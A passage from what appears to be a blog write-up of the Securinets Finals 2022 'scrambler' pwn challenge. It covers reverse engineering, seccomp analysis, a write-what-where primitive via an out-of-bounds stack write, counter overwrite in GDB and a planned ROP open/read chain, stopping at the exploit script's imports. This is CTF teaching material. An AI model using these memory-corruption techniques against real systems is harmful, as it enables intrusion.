@@ -1,0 +1,532 @@
+<!doctype html><html lang=es><head><title>scrambler | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Securinets Finals 2022. ROP. Ret2Libc. GOT overwrite. Stack Pivot. Seccomp rules"><meta itemprop=description content="Securinets Finals 2022. ROP. Ret2Libc. GOT overwrite. Stack Pivot. Seccomp rules"><meta name=twitter:description content="Securinets Finals 2022. ROP. Ret2Libc. GOT overwrite. Stack Pivot. Seccomp rules"><meta property="og:description" content="Securinets Finals 2022. ROP. Ret2Libc. GOT overwrite. Stack Pivot. Seccomp rules"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/pwn.png"><meta name=twitter:image content="https://7rocky.github.io/images/pwn.png"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="scrambler"><meta property="og:title" content="scrambler"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/scrambler/"><meta itemprop=keywords content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><div style=display:none>$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$</div><script src=/js/imc.js></script>
+<link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=/js/htb.js></script></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/ctf/other/scrambler/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3" style=line-height:30px><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">OTHER CTF</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/scrambler/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/scrambler/&text=scrambler" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/ctf/other/scrambler/&title=scrambler" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">scrambler</h1><br></header><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>scrambler</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>Arch:     amd64-64-little
+RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
+Stack:    <span class=code-dark-green>Canary found</span>
+NX:       <span class=code-dark-green>NX enabled</span>
+PIE:      <span class=code-dark-red>No PIE (0x400000)</span>  
+</code></pre></div><p>We also have the remote Glibc binary (<code>libc.so_1.6</code>), so we can use <code>pwninit</code> to patch the binary and use the provided library, so that the local and the remote exploits are equal:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwninit</span> --libc <span class=mtku>libc.so_1.6</span> --bin <span class=mtku>scrambler</span> --no-template
+<span class=code-dark-blue>bin</span>: <span class=code-blue>scrambler</span>
+<span class=code-dark-yellow>libc</span>: <span class=code-yellow>libc.so.6</span>
+
+<span class=code-green>fetching linker</span>
+<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.7_amd64.deb</span>
+<span class=code-yellow>unstripping libc</span>
+<span class=code-green>https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.7_amd64.deb</span>  
+<span class=code-dark-green>setting <span class=code-green>./ld-2.31.so</span> executable</span>
+<span class=code-dark-green>symlinking <span class=code-green>libc.so.6</span> -&gt; <span class=code-green>libc.so_1.6</span></span>
+<span class=code-dark-green>copying <span class=code-green>scrambler</span> to <span class=code-green>scrambler_patched</span></span>
+<span class=code-dark-green>running patchelf on <span class=code-green>scrambler_patched</span></span>
+</code></pre></div><p>Although the binary is stripped:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>file</span> <span class=mtku>scrambler</span>
+scrambler: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1343b327e61aac49d34bc641ccd80457126ef56e, for GNU/Linux 3.2.0, stripped  
+</code></pre></div><p>The reverse engineering process is not hard. After loading the binary in Ghidra and renaming variables and functions, we get this <code>main</code> function:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk1>undefined4</span> <span class=mtk1>uVar1;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar2;</span>
+  <span class="mtk7 mtki">long</span> <span class=mtk1>in_FS_OFFSET;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>option;</span>
+  <span class=mtk1>undefined4</span> <span class=mtk1>arg1;</span>
+  <span class=mtk1>undefined4</span> <span class=mtk1>arg2;</span>
+  <span class=mtk1>undefined4</span> <span class=mtk1>arg3;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
+  <span class=mtk1>undefined</span> <span class=mtk1>auStack40</span> <span class=mtk1>[</span><span class=mtk6>8</span><span class=mtk1>];</span>
+  <span class="mtk7 mtki">long</span> <span class=mtk1>canary;</span>
+
+  <span class=mtk1>canary</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
+  <span class=mtk8>setup</span><span class=mtk1>();</span>
+  <span class=mtk8>seccomp_rules</span><span class=mtk1>();</span>
+  <span class=mtk1>i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+
+  <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk6>true</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"1)</span> <span class=mtk4>Try</span> <span class=mtk4>scrambling"</span><span class=mtk1>);</span>
+    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"2)</span> <span class=mtk4>Quit"</span><span class=mtk1>);</span>
+    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+    <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span><span class=mtk5>&amp;</span><span class=mtk1>option);</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(option</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(i</span> <span class=mtk5>&lt;</span> <span class=mtk6>8</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg1</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg1);</span>
+      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg2</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg2);</span>
+      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"arg3</span> <span class=mtk4>=</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"&gt;</span> <span class=mtk4>"</span><span class=mtk1>);</span>
+      <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%d</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>arg3);</span>
+      <span class=mtk1>uVar1</span> <span class=mtk5>=</span> <span class=mtk1>arg3;</span>
+      <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk8>return_random</span><span class=mtk1>(arg1,arg2);</span>
+      <span class=mtk1>auStack40[iVar2]</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk1>)</span> <span class=mtk1>uVar1;</span>
+      <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>;</span>
+    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Not</span> <span class=mtk4>allowed!"</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Good</span> <span class=mtk4>bye!"</span><span class=mtk1>);</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>(canary</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">long</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_FS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>))</span> <span class=mtk1>{</span>
+                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>  
+    <span class=mtk8>__stack_chk_fail</span><span class=mtk1>();</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>The binary is protected with some <code>seccomp</code> rules. We can use <code>seccomp-tools</code> to see what system calls are we able to use:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>seccomp-tools</span> dump <span class=mtku>./scrambler</span>
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != <span class=rb-white>ARCH_X86_64</span>) goto 0012  
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < <span class=rb-green>0x40000000</span>) goto 0005
+ 0004: 0x15 0x00 0x07 0xffffffff  if (A != <span class=rb-green>0xffffffff</span>) goto 0012
+ 0005: 0x15 0x05 0x00 0x00000000  if (A == <span class=rb-green>read</span>) goto 0011
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == <span class=rb-green>write</span>) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000002  if (A == <span class=rb-green>open</span>) goto 0011
+ 0008: 0x15 0x02 0x00 0x0000000a  if (A == <span class=rb-green>mprotect</span>) goto 0011
+ 0009: 0x15 0x01 0x00 0x0000003c  if (A == <span class=rb-green>exit</span>) goto 0011
+ 0010: 0x15 0x00 0x01 0x000000e7  if (A != <span class=rb-green>exit_group</span>) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre></div><p>So, we are only able to use <code>open</code>, <code>read</code>, <code>write</code> and <code>mprotect</code>. Hence, the objective of the challenge is to read the flag (which is at <code>/home/ctf/flag.txt</code>, also provided for the challenge), and not to spawn a shell.</p><p>Analyzing the <code>main</code> function, we see that we can enter three numbers (<code>arg1</code>, <code>arg2</code> and <code>arg3</code>). Then, <code>arg1</code> and <code>arg2</code> will be passed to the function I renamed to <code>return_random</code>. The result of that function will be used an offset to a stack address and <code>arg3</code> will be the value to be stored in (as a <code>char</code>). Maybe the assembly instruction is clearer (taken from the output of <code>objdump</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>40150c:       88 54 05 e0             mov    BYTE PTR [rbp+rax*1-0x20],dl  
+</code></pre></div><p>This is <code>return_random</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>return_random</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">arg1</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">arg2</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
+  <span class="mtk7 mtki">time_t</span> <span class=mtk1>tVar2;</span>
+
+  <span class=mtk1>tVar2</span> <span class=mtk5>=</span> <span class=mtk8>time</span><span class=mtk1>((</span><span class="mtk7 mtki">time_t</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>);</span>
+  <span class=mtk8>srand</span><span class=mtk1>((</span><span class="mtk7 mtki">uint</span><span class=mtk1>)</span> <span class=mtk1>tVar2);</span>
+  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>rand</span><span class=mtk1>();</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>arg2</span> <span class=mtk5>+</span> <span class=mtk1>iVar1</span> <span class=mtk5>%</span> <span class=mtk1>arg1;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>It is taking a random value and doing some math operations with the arguments <code>arg1</code> and <code>arg2</code>. We could think of using a Pseudo-Random Number Generator (PRNG) initialized at <code>time(0)</code> as above, so that we know the value of <code>iVar2</code> and have more control on the returning value. However, we can get rid of the random value if we set <code>arg1 = 1</code>, because:</p><p>$$
+z = 0 \pmod{1} \quad, \forall z \in \mathbb{Z}
+$$</p><p>Therefore, if <code>arg1 = 1</code>, then <code>return_random(arg1, arg2) = arg2</code>, so we have full control on what <code>return_random</code> returns (maybe I should have changed the name of the function&mldr; not so random).</p><p>At this point, we have achieved a &ldquo;write-what-where&rdquo; primitive, because we control <code>arg3</code> (which will be stored in <code>$dl</code>, only 1 byte) and we control the returning value of <code>return_address</code> (which is the offset from <code>$rbp - 0x20</code>, placed in <code>$rax</code>).</p><p>There is yet another limitation in the <code>main</code> function, which is that program won&rsquo;t allow us to &ldquo;Try scrambling&rdquo; any more when the counter reaches <code>i = 8</code>. To bypass this, we can make use of the &ldquo;write-what-where&rdquo; primitive and fix the value of the counter to be a negative value, so that we get almost unlimited &ldquo;scrambling&rdquo; attempts. This is the assembly instruction that increments the counter:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>401510:       83 45 dc 01             add    DWORD PTR [rbp-0x24],0x1  
+</code></pre></div><p>We see that the counter is stored in <code>$rbp - 0x24</code>. The &ldquo;write-what-where&rdquo; is based in <code>$rbp - 0x20</code>, so the 4 bytes before (<code>int</code> values are sized 32 bits) we have the value of the counter. We can check it with GDB setting a breakpoint in that address:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>scrambler_patched</span>
+Reading symbols from <span class=code-dark-green>scrambler_patched</span>...
+(No debugging symbols found in <span class=code-dark-green>scrambler_patched</span>)  
+<span class=code-red>gef➤</span>  break *0x401510
+Breakpoint 1 at <span class=code-dark-blue>0x401510</span>
+<span class=code-red>gef➤</span>  run
+Starting program: ./scrambler_patched
+1) Try scrambling
+2) Quit
+&gt; 1
+arg1 =
+&gt; 1
+arg2 =
+&gt; -4
+arg3 =
+&gt; 100
+
+Breakpoint 1, <span class=code-dark-blue>0x0000000000401510</span> in <span class=code-dark-yellow>??</span> ()
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/x $rbp-0x24
+<span class=code-dark-blue>0x7fffffffe70c</span>: 0x00000064  
+<span class=code-green>gef➤</span>  x/d $rbp-0x24
+<span class=code-dark-blue>0x7fffffffe70c</span>: 100
+</code></pre></div><p>There we have it. We overwrote the value of the counter to be <code>100</code> (<code>0x64</code>). In order to achieve a negative value, we need that the most significant bit is set to <code>1</code>. In fact, the lower bound for <code>int</code> is $-2^{31}$, which is represented as <code>0x80000000</code> (more information <a href="https://docs.microsoft.com/en-us/cpp/c-language/cpp-integer-limits?view=msvc-170">here</a>). So if we use <code>-1</code> instead of <code>-4</code> and we put <code>128</code> (<code>0x80</code>) instead of <code>100</code>, we will get a large negative value, so we don&rsquo;t have to worry any more about the number of attempts.</p><p>Just for testing purposes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  run
+Starting program: ./scrambler_patched
+1) Try scrambling
+2) Quit
+&gt; 1
+arg1 =
+&gt; 1
+arg2 =
+&gt; -1
+arg3 =
+&gt; 128
+
+Breakpoint 1, <span class=code-dark-blue>0x0000000000401510</span> in <span class=code-dark-yellow>??</span> ()  
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x/x $rbp-0x24
+<span class=code-dark-blue>0x7fffffffe70c</span>: 0x80000000
+<span class=code-green>gef➤</span>  x/d $rbp-0x24
+<span class=code-dark-blue>0x7fffffffe70c</span>: -2147483648  
+</code></pre></div><p>Alright, now we can start thinking on what to do next for exploitation.</p><p>Since the objective is to read the flag and we are limited by <code>seccomp</code> rules, these will be the instructions we need to execute to complete the challenge:</p><ul><li><code>open("/home/ctf/flag.txt", O_RDONLY)</code></li><li><code>read(fd, buffer, length)</code></li><li><code>puts(buffer)</code></li></ul><p>Also, recall that NX is enabled, so we need to use ROP to execute arbitrary code. Since we have to enter <code>"/home/ctf/flag.txt"</code>, we need to find a gadget such as <code>mov qword ptr [rax], rdi; ret</code>, because we don&rsquo;t have more ways to enter text in the program. The binary does not have this type of gadgets, but Glibc does. Therefore, the first step will be to leak an address inside Glibc so that we can bypass ASLR and use offsets to gadgets.</p><p>Alright, let&rsquo;s start writing the exploit. This is what we have for the moment:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class="mtk8 mtku">ELF</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p64,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span><span class=mtk1>,</span> <span class=mtk1>u64</span>
+
